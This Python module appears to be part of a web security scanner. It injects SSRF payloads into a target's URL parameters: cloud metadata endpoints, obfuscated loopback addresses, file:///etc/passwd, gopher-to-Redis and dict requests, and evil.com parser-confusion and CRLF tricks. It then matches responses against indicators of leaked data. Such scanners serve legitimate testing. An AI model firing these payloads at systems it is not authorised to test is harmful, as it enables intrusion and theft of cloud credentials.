"""
WSHawk Blind Probe (SSRF) Engine
Tests URL parameters for Server-Side Request Forgery vulnerabilities by
injecting internal IP addresses, cloud metadata endpoints, and protocol
smuggling payloads.
"""

import aiohttp
import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, Any, List, Optional


# SSRF payloads organized by category
SSRF_PAYLOADS = {
    "Cloud Metadata": [
        "http://169.254.169.254/latest/meta-data/",          # AWS
        "http://169.254.169.254/computeMetadata/v1/",        # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://100.100.100.200/latest/meta-data/",           # Alibaba
        "http://169.254.169.254/opc/v1/instance/",            # Oracle
    ],
    "Internal Network": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://0177.0.0.1/",                      # Octal
        "http://2130706433/",                       # Decimal
        "http://0x7f000001/",                       # Hex
        "http://127.1/",                            # Short form
        "http://192.168.1.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
    ],
    "Protocol Smuggling": [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/INFO",              # Redis
        "gopher://127.0.0.1:6379/_INFO",            # Gopher->Redis
        "ftp://127.0.0.1/",
    ],
    "DNS Rebinding": [
        "http://spoofed.oob-interact.example/",      # Example OOB
        "http://localtest.me/",                     # Resolves to 127.0.0.1
        "http://127.0.0.1.nip.io/",                 # nip.io
        "http://customer1.app.localhost/",           # .localhost TLD
    ],
    "Bypass Techniques": [
        "http://127.0.0.1:80/",
        "http://127.0.0.1:443/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:3000/",
        "http://0/",
        "http://127.0.0.1#@evil.com/",             # URL parser confusion
        "http://evil.com@127.0.0.1/",              # Authority confusion
        "http://127.0.0.1%0d%0aHost:evil.com/",    # CRLF
    ],
}

# Indicators that an SSRF succeeded
SSRF_INDICATORS = {
    "Cloud Metadata": [
        r"ami-id", r"instance-id", r"local-hostname", r"public-keys",
        r"computeMetadata", r"project-id", r"zone",
        r"subscriptionId", r"resourceGroupName",
    ],
    "Internal Access": [
        r"root:.*:0:0", r"daemon:",           # /etc/passwd
        r"\[extensions\]",                     # win.ini
        r"redis_version", r"connected_clients",  # Redis
        r"<title>.*Dashboard",                # Internal dashboards
        r"phpinfo\(\)",                        # PHP info
    ],
    "Reflection": [
        r"127\.0\.0\.1", r"localhost", r"169\.254\.169\.254",
        r"10\.\d+\.\d+\.\d+", r"192\.168\.\d+\.\d+", r"172\.(1[6-9]|2\d|3[01])\.",
    ],
}


class WSHawkBlindProbe:
    """
    Tests for Server-Side Request Forgery (SSRF) vulnerabilities.

    Injects crafted URLs into URL-like parameters and analyzes responses
    for evidence of internal access, cloud metadata exposure, or
    protocol smuggling.

    Features:
        - Auto-detects URL-like parameters in target requests
        - 50+ SSRF payloads across 5 categories
        - Cloud metadata detection (AWS, GCP, Azure, Alibaba, Oracle)
        - Protocol smuggling (file://, dict://, gopher://)
        - DNS rebinding payloads
        - Response analysis with indicator matching
    """

    def __init__(self, sio_instance=None):
        self.sio = sio_instance

    async def probe(
        self, url: str, param: str = "", method: str = "GET",
        body: str = "", custom_payloads: List[str] = None,
    ) -> Dict[str, Any]:
        """
        Test a URL for SSRF vulnerabilities.

        Args:
            url: Target URL containing injectable parameters.
            param: Specific parameter to test (auto-detects if empty).
            method: HTTP method.
            body: Request body for POST requests.
            custom_payloads: Additional payloads to test.

        Returns:
            Dict with 'findings', 'params_tested', and 'payloads_sent'.
        """
        if not url or not url.strip():
            raise ValueError("URL is required")

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        start = time.time()
        findings: List[Dict] = []
        payloads_sent = 0

        # Identify testable parameters
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)

        # Auto-detect URL-like parameters
        target_params = []
        if param:
            target_params = [param]
        else:
            for k, vals in query_params.items():
                for v in vals:
                    if self._looks_like_url(v) or k.lower() in (
                        "url", "uri", "link", "src", "href", "redirect",
                        "next", "return", "callback", "target", "dest",
                        "destination", "redir", "redirect_uri", "continue",
                        "return_to", "go", "out", "view", "page", "file",
                        "path", "load", "fetch", "proxy", "forward",
                    ):
                        target_params.append(k)

        if not target_params:
            return {
                "url": url,
                "findings": [],
                "params_tested": [],
                "payloads_sent": 0,
                "elapsed": round(time.time() - start, 2),
                "note": "No URL-like parameters detected. Specify a param manually."
            }

        target_params = list(set(target_params))

        # Build all payloads
        all_payloads = []
        for category, payloads in SSRF_PAYLOADS.items():
            for payload in payloads:
                all_payloads.append((category, payload))

        if custom_payloads:
            for p in custom_payloads:
                all_payloads.append(("Custom", p))

        # Test each parameter with each payload
        sem = asyncio.Semaphore(5)

        async def _test(param_name: str, category: str, payload: str):
            nonlocal payloads_sent
            async with sem:
                payloads_sent += 1
                try:
                    # Inject payload into parameter
                    test_params = dict(query_params)
                    test_params[param_name] = [payload]

                    new_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, parsed.fragment
                    ))

                    timeout = aiohttp.ClientTimeout(total=8)
                    async with aiohttp.ClientSession() as session:
                        async with session.request(
                            method, test_url, ssl=False,
                            allow_redirects=False, timeout=timeout
                        ) as resp:
                            resp_body = await resp.text(errors='ignore')
                            resp_body = resp_body[:5000]
                            status = resp.status

                    # Analyze response
                    indicators_hit = self._check_indicators(resp_body, category)

                    if indicators_hit or (status == 200 and len(resp_body) > 100):
                        severity = "High" if indicators_hit else "Low"
                        finding = {
                            "param": param_name,
                            "payload": payload,
                            "category": category,
                            "status": status,
                            "severity": severity,
                            "indicators": indicators_hit,
                            "response_length": len(resp_body),
                        }
                        findings.append(finding)

                        if self.sio:
                            await self.sio.emit("ssrf_finding", finding)

                except asyncio.TimeoutError:
                    pass  # Timeouts can indicate firewall blocking
                except Exception:
                    pass

        tasks = []
        for param_name in target_params:
            for category, payload in all_payloads:
                tasks.append(_test(param_name, category, payload))

        await asyncio.gather(*tasks)

        elapsed = round(time.time() - start, 2)

        return {
            "url": url,
            "findings": findings,
            "params_tested": target_params,
            "payloads_sent": payloads_sent,
            "total_findings": len(findings),
            "elapsed": elapsed,
        }

    def _looks_like_url(self, value: str) -> bool:
        """Check if a parameter value looks like a URL."""
        return bool(re.match(
            r"^(https?://|//|/[a-zA-Z]|www\.)", value, re.IGNORECASE
        ))

    def _check_indicators(self, body: str, category: str) -> List[str]:
        """Check response body for SSRF success indicators."""
        hits = []
        for cat_name, patterns in SSRF_INDICATORS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    hits.append(f"{cat_name}: {pattern}")
        return hits[:5]  # Cap at 5
